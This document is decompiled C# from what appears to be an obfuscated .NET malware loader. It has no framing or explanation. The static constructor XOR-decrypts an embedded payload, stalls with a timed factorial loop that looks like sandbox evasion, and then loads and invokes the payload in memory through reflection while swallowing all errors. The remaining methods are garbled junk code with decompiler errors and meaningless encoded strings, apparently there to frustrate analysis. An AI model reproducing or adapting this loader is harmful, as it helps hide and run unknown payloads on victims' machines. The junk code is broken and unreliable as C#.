using System;
using System.Collections.Generic;
using System.Globalization;
using System.Numerics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Remoting.Metadata.W3cXsd2001;
using System.Threading;
using ns1;

namespace ns0;

internal static class Class3
{
	internal delegate void Delegate0();

	public static byte[] byte_0;

	public static byte[] smethod_0(byte[] byte_1)
	{
		for (int i = 0; i < byte_1.Length; i++)
		{
			byte_1[i] = (byte)(byte_1[i] ^ byte_0[i % byte_0.Length]);
		}
		return byte_1;
	}

	public static byte[] smethod_1(string string_0)
	{
		return SoapHexBinary.Parse(string_0).get_Value();
	}

	static Class3()
	{
		byte_0 = smethod_1("19");
		try
		{
			BigInteger bigInteger = new BigInteger(1);
			float num = 165f;
			for (int i = 1; (float)i <= num; i++)
			{
				bigInteger *= (BigInteger)i;
				new AutoResetEvent(initialState: false).WaitOne(i);
			}
			smethod_2();
		}
		catch
		{
		}
	}

	private static void Main()
	{
	}

	public static void smethod_2()
	{
		MethodInfo method = Thread.GetDomain().Load(smethod_0(Class1.byte_0)).GetTypes()[19].GetMethods()[0];
		((Delegate0)Delegate.CreateDelegate(typeof(Delegate0), null, method))();
	}

	static void esidayamik0()
	{
	}

	static void ivetabubev1()
	{
	}

	static void ivetabubev2()
	{
	}

	unsafe static void ivetabubev3()
	{
		//IL_001e: Expected O, but got I4
		//IL_0059: Expected O, but got I4
		//IL_0063: Expected O, but got I4
		//IL_0069: Expected I4, but got O
		//IL_00b0: Expected O, but got I4
		//IL_00b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d3: Expected Ref, but got Unknown
		//IL_00df: Expected O, but got I4
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e5: Expected I4, but got Unknown
		//IL_0116: Expected O, but got I4
		//IL_0125: Expected O, but got I4
		//IL_012e: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0132: Expected I4, but got Unknown
		//IL_0145: Expected O, but got I4
		//IL_0149: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected I4, but got Unknown
		//IL_0150: Expected O, but got I4
		//IL_0159: Expected I4, but got O
		//IL_015a: Expected O, but got F8
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		//IL_015f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Unknown result type (might be due to invalid IL or missing references)
		//IL_0166: Expected Ref, but got Unknown
		//IL_0172: Expected O, but got I4
		//IL_017b: Unknown result type (might be due to invalid IL or missing references)
		//IL_017e: Expected I4, but got Unknown
		//IL_01aa: Expected O, but got I4
		//IL_01c9: Expected O, but got I4
		//IL_01d9: Expected O, but got I4
		//IL_01e8: Expected O, but got I4
		//IL_01f6: Expected O, but got I4
		//IL_01fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fe: Expected I4, but got Unknown
		//IL_021d: Expected O, but got I4
		//IL_023e: Expected O, but got I8
		//IL_024e: Expected O, but got I4
		//IL_0257: Expected I4, but got O
		//IL_0258: Expected O, but got I
		//IL_0261: Expected I4, but got O
		//IL_0262: Expected O, but got I4
		//IL_0268: Expected I4, but got O
		//IL_029b: Expected O, but got I4
		//IL_029f: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a2: Expected I4, but got Unknown
		//IL_02b1: Expected O, but got I4
		//IL_02c5: Expected O, but got I4
		//IL_02da: Expected O, but got I4
		uint num = num;
		_ = (Struct3)((uint*)num)->ToString();
		sbyte b = (sbyte)((uint)(sbyte)((short*)(-26363))->ToString(((int*)603313965)->GetHashCode() as string) / (uint)b);
		sbyte num2 = b;
		string text = "DQMX8/rfGESnrOPDBksOYeCV30eos+JEGgZHl2w6TOhNIpUa8lVZHeyk7AeVqioBMZQKTGnMTx/5AkwBxL1XECdV9w==";
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text2);
		text = text2;
		string value = ((ushort*)1431)->ToString(text);
		string s = text;
		IFormatProvider formatProvider = formatProvider;
		object obj = sbyte.Parse(s, formatProvider);
		object obj2 = bool.TryParse(value, out *(bool*)((obj is ref bool) ? obj : null));
		byte b2 = (byte)(int)((obj2 is byte) ? obj2 : null);
		byte num3 = b2;
		text = text;
		byte[] byte_ = null;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text3);
		_ = (long)((byte*)num3)->ToString(text3, (IFormatProvider)(object)smethod_0(byte_));
		System.Runtime.CompilerServices.Unsafe.SkipInit(out long num4);
		uint num5 = (uint)num2 / (uint)(sbyte)((long*)checked(1030765834uL - unchecked((ulong)num4)))->ToString("492VHnrhnltFReqsc5b49olS076neapFpn/aE2VS5rdGq7Nl1SxbpxZwCrtNn09naDSTruWHu9VuWuV9527YfWe4zA==", formatProvider);
		sbyte num6 = b;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag);
		bool num7 = (flag = flag);
		object obj3 = short.Parse(text);
		_003F val = checked(num7 - ((obj3 is bool) ? obj3 : null));
		formatProvider = null;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ref ushort result);
		object obj4 = ushort.TryParse(((bool*)val)->ToString((IFormatProvider)(object)((byte*)85)->ToString("Bp4TnpMK4WZuSezNMgLAJG+UnLxcxtjmrPucxatzYLqjJc7N4+UHXpcEC5UNNIYvYZkJWvadoh9sVxJEmZuJ+h7ipQ==", formatProvider2)), out result);
		b = (sbyte)checked(num6 - ((obj4 is sbyte) ? obj4 : null));
		sbyte num8 = (sbyte)smethod_1(text);
		uint num9 = (uint)b / 49u;
		byte num10 = b2;
		byte num11 = b2;
		object obj5 = ((ulong*)1603217861L)->GetTypeCode();
		object obj6 = ((obj5 is int) ? obj5 : null);
		object obj7 = null;
		object obj8 = ((int*)obj6)->CompareTo(obj7);
		b2 = (byte)(68 / checked(((obj8 is byte) ? obj8 : null) * 19));
		object obj9 = char.GetNumericValue((char)(int)/*isinst with value type is only supported in some contexts*/);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out sbyte b4);
		object obj10 = ((int*)(int)((sbyte*)(num5 / checked(-68 - unchecked(b4 / ((obj9 is sbyte) ? obj9 : null)))))->ToString())->CompareTo(null);
		b2 = (byte)checked(((obj10 is byte) ? obj10 : null) + 10);
		char c = (char)NfhsHRESlKmCveMaKCqUJqqJqpNGY0hY.Default;
		char num12 = c;
		char num13 = c;
		long num14 = (long)NfhsHRESlKmCveMaKCqUJqqJqpNGY0hY.Default;
		text = text;
		NumberStyles numberStyles = numberStyles;
		object obj11 = sbyte.TryParse(((byte*)/*isinst with value type is only supported in some contexts*/)->ToString(), out *(sbyte*)/*isinst with value type is only supported in some contexts*/);
		c = (char)checked(num12 + num13 * ((obj11 is char) ? obj11 : null));
		text = "tVurojkv8E+bZoZc9qyVIKdTYod5SDQ6uGMvPuA4KgTk8Qv1r4pLHw8Df0h/0NZS3V1vhMARy76wGmm1x7Q3+bPa0A==";
		_ = char.IsUpper((char)checked(unchecked((char)NfhsHRESlKmCveMaKCqUJqqJqpNGY0hY.Default) + unchecked((uint)c / 40082u))) is ushort;
		string s3 = text;
		int hashCode = ((int*)(-994355027))->GetHashCode();
		string s4 = long.Parse("thDHYJKvC9nK3ZGN7IDoYgYm/PoW82j5x1HMZCfvagfF+Myu67vZH6Kj7JxUCqWb8CjE+UOn3BrMeF5drfMcaS39OA==", null) as string;
		object obj12 = uint.Parse("A6evq/HOTnnvVx7SYDGe+aPZhIqVFZF3n47j3aEAbNHWI4HrtH2eS5AhfT5yll3UsBnG1XSuQN7yP8gnZCLnS79M0w==");
		object obj13 = (nint)(IntPtr)(int)((obj12 is int) ? obj12 : null);
		object obj14 = ((bool*)null)->Equals((byte)(int)((obj13 is bool) ? obj13 : null) != 0);
		int num15 = (int)((obj14 is int) ? obj14 : null);
		int num16 = num15;
		num15 = Class0.Int32_0;
		uint num19;
		uint num20;
		checked
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out int num17);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out int num18);
			num19 = unchecked((uint)num17) - (unchecked((uint)num16) + unchecked((uint)num18));
			num20 = unchecked((uint)num15) + unchecked((uint)num15);
			formatProvider = formatProvider;
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider3);
		object obj15 = ((int*)num20)->Equals(((ulong*)305494309L)->ToString(formatProvider3));
		num15 = (int)(num19 / ((obj15 is int) ? obj15 : null));
		_ = char.IsLetterOrDigit(s3, (int)((uint)hashCode / checked(3011329032u - unchecked((uint)char.ConvertToUtf32(s4, num15))))) is _003CModule_003E;
		_ = ((long*)(-1305782854L))->GetHashCode() is short;
		obj7 = obj7;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object value2);
		_ = ((short*)22969)->CompareTo(value2) is short;
	}

	unsafe static void umifebabesuf4()
	{
		//IL_0028: Expected O, but got I4
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got I
		//IL_008c: Expected O, but got I4
		//IL_0099: Expected O, but got I4
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		byte num = (byte)smethod_1("WI/LuH+ceqf8V7PeHXOQ3wafLUoHw7TZqO8w1XKuYywMnEiPhM8jtT9sgIk2ihswQz5DicYEFO9Is9b/b67z7o441g==");
		byte num2 = (byte)((long*)75344748L)->ToString();
		object obj = Class0.Int32_0;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b);
		_003F val = num2 / checked(((obj is byte) ? obj : null) * (unchecked((uint)checked(b + unchecked((byte)((ushort*)27930)->ToString("9xL3dhdC8F008OdVQlvgBj/EZJNLDlG1R+XR7kP3bDj43724avSHn+kyLOgVhXzsykPCplTepHzD/cYiZAC2P/6zdw==")))) * 124u));
		System.Runtime.CompilerServices.Unsafe.SkipInit(out nint intPtr);
		IntPtr num3 = intPtr;
		intPtr = intPtr;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out nint num4);
		intPtr = (nint)checked(unchecked((nuint)(nint)num3) + unchecked((nuint)num4 / (nuint)intPtr));
		string text = (string)(object)(void*)(IntPtr)intPtr;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text2);
		text = text2;
		string text3 = text;
		IFormatProvider formatProvider = formatProvider;
		formatProvider = formatProvider;
		short num5 = (short)((long*)(-1191046080L))->ToString(text3, formatProvider);
		uint num6 = 5357u / (uint)num5;
		text = Class0.Int32_0 as string;
		checked
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out string text4);
			_ = val - unchecked((byte)((short*)num6)->ToString(text4, Class0.Int32_0 as IFormatProvider));
			b = b;
			b = num;
		}
	}

	static void umifebabesuf5()
	{
	}

	unsafe static void umifebabesuf6()
	{
		//IL_0021: Expected O, but got I4
		//IL_0030: Expected O, but got I4
		//IL_003c: Expected O, but got I4
		//IL_005f: Expected O, but got I4
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Expected I8, but got Unknown
		//IL_006e: Expected O, but got I4
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		//IL_009e: Expected O, but got I4
		//IL_00a4: Expected I4, but got O
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Expected I4, but got Unknown
		//IL_00ad: Expected O, but got I4
		//IL_00c2: Expected O, but got I4
		//IL_00c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Expected O, but got I4
		//IL_00e8: Expected I4, but got O
		//IL_00e8: Expected Ref, but got Unknown
		//IL_00e9: Expected O, but got I4
		//IL_014c: Expected O, but got I4
		//IL_01cc: Expected O, but got I4
		//IL_01d2: Expected I, but got O
		//IL_01e5: Expected O, but got I4
		//IL_0229: Expected O, but got I4
		//IL_024c: Expected O, but got I4
		//IL_0255: Expected I4, but got O
		//IL_0256: Expected O, but got I4
		//IL_0264: Expected O, but got I
		//IL_0275: Expected O, but got I4
		//IL_029b: Expected O, but got I4
		//IL_02a5: Expected O, but got I8
		//IL_02c9: Expected O, but got I4
		//IL_02cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ea: Expected O, but got I4
		//IL_02ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_030f: Expected O, but got I4
		//IL_0313: Unknown result type (might be due to invalid IL or missing references)
		//IL_0319: Expected Ref, but got Unknown
		//IL_0326: Expected O, but got I4
		//IL_033a: Expected Ref, but got Unknown
		//IL_034b: Expected O, but got I4
		//IL_0382: Expected O, but got I4
		//IL_03b0: Expected O, but got I4
		//IL_03d0: Expected O, but got I4
		//IL_03d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03da: Expected I4, but got Unknown
		//IL_03db: Expected O, but got I4
		//IL_03ee: Expected O, but got I4
		//IL_03f8: Expected O, but got I4
		//IL_03fe: Expected I8, but got O
		string text = "IQ/1R/M4Eqz81z7laVtRmwywYo8Ule7fFJBzmCjgCpOl8Ncuymj3NlvOs9Et7BKGaDIrjChH2ASDmh195qeK+76FKQ==";
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string s);
		object obj = uint.Parse(s, (NumberStyles)((short*)3210)->ToString("CtTDR/cB9HVCqLlJM1HOSHUJUephkZw12obwLT2tX/Z3D573H1BDDvJFGUdUTLDu1YsiP5fzRBJAhG3puIp3wIHWQw=="));
		object obj2 = ((obj is short) ? obj : null);
		IFormatProvider provider = Class0.Int32_0 as IFormatProvider;
		_ = int.Parse("xaGfj0sQ1qdHXxyPyw6uzpIkKPHGopSqM+Woukz3uQycZPbPrRGYXcLOHcm/Pu2YnpDyjZGoOxHfninrqi3gOZ0iyQ==", provider) is ulong;
		object obj3 = ((int*)(int)((int*)(-2069765580))->ToString((IFormatProvider?)null))->GetTypeCode();
		ulong num = (ulong)checked(678025164L * ((obj3 is ulong) ? obj3 : null));
		object obj4 = ((ulong*)num)->CompareTo(num);
		_003F val = checked(((obj4 is short) ? obj4 : null) - (1829u - 27183u));
		bool flag = (byte)checked(0u - unchecked(1u / (((byte)NfhsHRESlKmCveMaKCqUJqqJqpNGY0hY.Default != 0) ? 1u : 0u))) != 0;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag2);
		uint num2 = 1u / (flag2 ? 1u : 0u);
		flag = (byte)num2 != 0;
		object obj5 = ((bool*)1)->CompareTo((byte)(num2 / num2) != 0);
		short num3 = (short)(int)((obj5 is short) ? obj5 : null);
		string obj6 = ((short*)obj2)->Equals((short)checked(val + num3)) as string;
		byte b = b;
		byte num4 = b;
		object obj7 = bool.Parse("vpHhSaB8vH8ey8Klxzqr+zxDttt4PUUfM+HTEJ9u1CHFTe8UQ/NbzCrEbK+WeitjTacbaqGDFA1sfdrpzLOkuOdfgQ==");
		_003F val2 = checked(num4 + ((obj7 is byte) ? obj7 : null));
		ulong num5 = num;
		object obj8 = null;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj9);
		obj8 = obj9;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj10);
		obj8 = obj10;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj11);
		obj8 = obj11;
		ref _003F reference = ref *(_003F*)val2;
		object obj12 = ((ulong*)num5)->CompareTo(obj8);
		int num6 = (int)obj6.Split(System.Runtime.CompilerServices.Unsafe.As<_003F, byte>(ref reference).Equals((byte)(int)((obj12 is byte) ? obj12 : null)) as char[]);
		text = "eAC3s8PAeyjs88yTSfv4V+Wu9Ah2+GaTWMnG3k87WlV0sV80WRemkGUHgXyeC2ZK2Qwi6V9AU+iXZ9FlXjjVy7aCBQ==";
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text2);
		text = text2;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text3);
		int num7 = (int)((uint)num6 / (uint)(int)text3.ToCharArray());
		uint num8;
		int num9;
		checked
		{
			num8 = unchecked((uint)num7 / (uint)num7) + 1518735497u - (3554548011u + unchecked((uint)num7) + 3125569562u) - 908473587u;
			num9 = num7;
			text = text;
			System.Runtime.CompilerServices.Unsafe.SkipInit(out string text4);
			text = text4;
			NumberStyles numberStyles = numberStyles;
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string s2);
		int num10 = (int)string.Concat<T>((IEnumerable<T>)(IEnumerable<_0021_00210>)(object)smethod_1(uint.Parse(s2, default(NumberStyles)) as string));
		num7 = (int)checked(unchecked((uint)(int)smethod_1(text)) - (1794300451u + unchecked((uint)(int)smethod_0(null))));
		System.Runtime.CompilerServices.Unsafe.SkipInit(out int num11);
		text = char.ConvertFromUtf32((int)checked(num8 * (unchecked((uint)num9) + unchecked((uint)num10 / checked(4167550054u * (unchecked((uint)num11) + unchecked((uint)Class0.Int32_0) - unchecked((uint)(int)smethod_0(null))) * (1825434996u * 3293920464u))))));
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text5);
		text = text5;
		object obj13 = byte.TryParse(text, default(NumberStyles), provider, out *(byte*)null);
		IntPtr num12 = (nint)((obj13 is IntPtr) ? obj13 : null);
		text = text;
		num7 = -197634211;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string s3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out int index);
		_ = char.GetUnicodeCategory(s3, index) is IntPtr;
		_ = (IntPtr)smethod_0(null);
		num12 = default(IntPtr);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IntPtr intPtr);
		num12 = intPtr;
		num3 = num3;
		_ = ((char*)checked(unchecked((uint)(char)string.Format(provider, text, obj8)) * 53423u))->Equals('矂') is short;
		string s4 = text;
		string s5 = text;
		_ = ref *(short*)smethod_1("SyCDo2zt8enPjkT04l2jRBTPrAqHgESTXuEX7doN2xnReaImE74O+YeNf09SW57Yu5+qnfnSaomcunUP6w2w0Ha7uA==");
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ref short result);
		object obj14 = short.TryParse(s5, out result);
		_ = char.IsWhiteSpace(s4, (int)((obj14 is int) ? obj14 : null)) is uint;
		uint num13 = (uint)(object)((IntPtr*)num12)->ToPointer();
		string text6 = text;
		_ = char.IsNumber(text, -1630136110) is IEnumerable<_0021_00210>;
		IEnumerable<_0021_00210> enumerable = enumerable;
		_ = long.Parse(((bool*)checked(1u - ((unchecked((byte)((uint*)num13)->ToString(text6, (IFormatProvider)(object)string.Concat<T>((IEnumerable<T>)enumerable))) != 0) ? 1u : 0u)))->GetHashCode() as string) is ushort;
		num = num;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ulong num14);
		_ = (sbyte)((ulong*)num14)->ToString(text);
		object obj15 = Class0.Int32_0;
		_003F val4;
		checked
		{
			_003F val3 = unchecked((nuint)unchecked((nint)default(IntPtr))) + ((obj15 is IntPtr) ? obj15 : null);
			object obj16 = short.Parse(text, provider);
			val4 = unchecked(val3 / checked(unchecked((nuint)unchecked((nint)default(IntPtr))) * (unchecked((nuint)unchecked((nint)default(IntPtr))) * ((obj16 is IntPtr) ? obj16 : null)))) + unchecked((nuint)unchecked((nint)default(IntPtr)));
		}
		byte num15 = (byte)smethod_1(text);
		object obj17 = long.TryParse(text, out *(long*)null);
		byte num16 = (byte)((byte*)checked(num15 * ((obj17 is byte) ? obj17 : null)))->ToString();
		string text7 = text;
		provider = ((int*)null)->GetHashCode() as IFormatProvider;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider);
		text = ((byte*)num16)->ToString(text7, formatProvider);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text8);
		_ = short.Parse(((IntPtr*)val4)->ToString(text8), default(NumberStyles), null) is sbyte;
		sbyte b2 = b2;
		ushort num17 = num17;
		b2 = (sbyte)((ushort*)num17)->ToString();
		string value = ((uint*)179422230)->ToString((IFormatProvider?)null);
		object obj18 = ((ulong*)1624823529L)->Equals(null);
		ref _003F reference2 = ref *(_003F*)checked((bool.TryParse(value, out *unchecked((bool*)((obj18 is ref bool) ? obj18 : null))) ? 1u : 0u) + ((unchecked((byte)smethod_0(null)) != 0) ? 1u : 0u));
		uint num18 = checked((flag ? 1u : 0u) * 1u);
		object obj19 = ((ulong*)(ulong)string.Format((IFormatProvider)(object)smethod_1("vjw3qiQvbKoeg1WREENInVxldskL7F5/TGxSm4RYvJs5xSVJKrMVZz8u/1eJvJ3Er4WR2M9nkUCBgNqKFs9Sr3Uxng=="), (string)(object)smethod_0(Class0.Int32_0 as byte[]), obj8))->GetHashCode();
		_ = System.Runtime.CompilerServices.Unsafe.As<_003F, bool>(ref reference2).CompareTo((byte)(int)checked(num18 * ((obj19 is bool) ? obj19 : null)) != 0) is ushort;
		NfhsHRESlKmCveMaKCqUJqqJqpNGY0hY nfhsHRESlKmCveMaKCqUJqqJqpNGY0hY = nfhsHRESlKmCveMaKCqUJqqJqpNGY0hY;
		nfhsHRESlKmCveMaKCqUJqqJqpNGY0hY = null;
		object obj20 = text.EndsWith(Class0.Int32_0 as string);
		long num19 = (long)((obj20 is long) ? obj20 : null);
		num19 = num19;
	}

	static void umifebabesuf7()
	{
		long num = (long)checked(unchecked((ulong)num) * 18446744072807323587uL);
		num = -1711880191L;
		sbyte b = (sbyte)checked(4294967239u + unchecked((uint)b));
		b = -62;
	}
}
